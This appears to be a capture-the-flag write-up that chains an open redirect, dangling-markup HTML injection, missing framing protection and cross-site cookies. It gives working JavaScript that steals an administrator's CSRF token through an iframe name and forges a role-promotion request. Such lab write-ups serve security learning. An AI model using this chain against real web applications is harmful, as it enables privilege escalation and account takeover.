# Cyber Command: admin flag: how to solve

## Approach

The source reveals several weaknesses that become useful only when chained: a redirect check accepts a scheme-relative destination, one page renders stored user input as markup, the content security policy does not prevent another origin from framing the application, and an administrator-only form changes a user's role. A dangling-markup payload can capture the administrator's CSRF field in an iframe name. After that child frame is navigated to `about:blank`, callback-origin JavaScript can read the preserved name and submit the captured token in an authenticated cross-origin form.

Keep instance URLs, callback logs, captured tokens, account credentials, and returned challenge values outside this repository. In the examples below, replace every bracketed placeholder with the value from the current instance.

## Review the source and headers

1. Trace login and registration redirects. The destination validator checks only that the supplied `next` value starts with `/`. A value beginning with `//` satisfies that check but is interpreted by a browser as a scheme-relative URL. Reproduce the behavior with a unique callback path, then map the observed weakness to an applicable entry in the CWE catalog without recording its numeric response here.
2. Follow user-controlled fields from `request.form` into the templates. Identify the page where a stored comment is rendered without HTML escaping. Confirm it with a harmless marker element, and use `[UNSANITIZED_PAGE]` for that path in private notes and the examples below.
3. Inspect the session and CSRF design. The session cookie is `Secure`, `HttpOnly`, and `SameSite=None`. JavaScript cannot read that cookie, but cross-site requests can still carry it. The per-session CSRF token is rendered into forms, and the administrator-only promotion handler expects that token plus a username.
4. Compare what the CSP does with what it omits. Direct scripts and resource loads in the portal are tightly restricted, but there is no `frame-ancestors` directive and no equivalent `X-Frame-Options` header. The portal can therefore be embedded by the callback origin. `frame-src 'none'` controls frames created *by* the portal; it does not stop other sites from framing the portal.

## Confirm the redirect and callback cookie

Have the already-authenticated bot visit a login URL whose `next` parameter is a scheme-relative callback location:

```text
/login?next=//callback/[UNIQUE_MARKER]
```

The callback service should record a request for the marker. Inspect that request in the challenge's callback log interface. This confirms the redirect behavior and exposes the callback-origin cookie attached by the bot without requiring portal-origin script execution. Record the requested CWE ID and cookie value only in the challenge platform or private notes.

## Capture the administrator's CSRF token

1. Register a normal account with a unique username. Store the following deliberately unclosed markup as that account's comment on `[UNSANITIZED_PAGE]`:

   ```html
   <iframe name='
   ```

   When an administrator loads the page, the browser consumes later markup as the iframe's `name` attribute. Because a later form contains the administrator session's CSRF token, that serialized markup becomes part of the child browsing context's name.

2. Configure the callback service to return a controller page. The tested structure used one iframe for the portal page and a second, same-origin controller frame:

   ```javascript
   const victim = document.createElement("iframe");
   victim.id = "victim";
   victim.src = "https://portal/[UNSANITIZED_PAGE]";
   victim.onload = () => {
     // WindowProxy access by index is allowed even before its document is readable.
     victim.contentWindow[0].location = "about:blank";
   };

   const controller = document.createElement("iframe");
   controller.src = "/[CONTROLLER_PATH]";

   document.documentElement.append(controller, victim);
   ```

3. On `[CONTROLLER_PATH]`, wait until the portal iframe has loaded and its first child has completed the `about:blank` navigation. The navigation gives that child an origin the callback controller can read while preserving its `window.name`. Extract the token from the captured markup, but do not send the token to public logs:

   ```javascript
   const victim = parent.document.getElementById("victim");
   const child = victim.contentWindow[0];
   const captured = child.document.defaultView.name;
   const match = captured.match(
     /name="csrf_token" value="([0-9a-f]{64})"/
   );

   if (!match) throw new Error("CSRF field was not captured");
   const csrfToken = match[1];
   ```

   Use a bounded load signal or a short delay after `victim.onload`; reading too early produces an empty or inaccessible value. A private marker request can distinguish load, parse, and submission failures without including `captured` or `csrfToken` in its URL.

## Promote the attacker account

From the callback controller, build and submit a form to the administrator-only promotion endpoint. The browser attaches the administrator's portal cookie because it is a normal form navigation and the session permits cross-site use. The portal's `form-action 'self'` policy does not govern a form created in the callback document.

```javascript
const form = document.createElement("form");
form.method = "POST";
form.action = "https://portal/admin/promote";

for (const [name, value] of [
  ["csrf_token", csrfToken],
  ["username", "[ATTACKER_USERNAME]"],
]) {
  const input = document.createElement("input");
  input.type = "hidden";
  input.name = name;
  input.value = value;
  form.appendChild(input);
}

document.documentElement.appendChild(form);
form.submit();
```

Trigger the controller through the bot using the scheme-relative login redirect. Once the bot finishes, authenticate normally as `[ATTACKER_USERNAME]` and request `/admin`. Keep the returned value private and submit it directly to the challenge platform.

## Check your work

Use distinct callback markers to confirm the bot reached the start page, the victim iframe loaded, the CSRF field was found, and the promotion form was submitted. Then verify the role change independently: a fresh login as the attacker account should receive `/admin` with a successful response instead of a redirect or `403`.

This complete chain was reproduced against a fresh challenge instance: the token-capture marker was observed, the promotion completed, and the attacker account could load the protected page. That verifies technical recovery; it does not record or claim platform acceptance of any response.

## Limits

The instance is ephemeral, and its in-memory users, comments, callback response, and callback logs may be shared with other solvers. Use unique names and markers, restore callback configuration when finished, and restart from registration after an instance reset. The dangling-markup step depends on the template placing a suitable CSRF-bearing form after the injected comment and on the browser exposing the generated child browsing context at index zero; re-check those assumptions if the source or browser version changes.

Before publishing further changes, follow the [CTF playbook](../../docs/ctf-playbook.md) and run the repository content check.
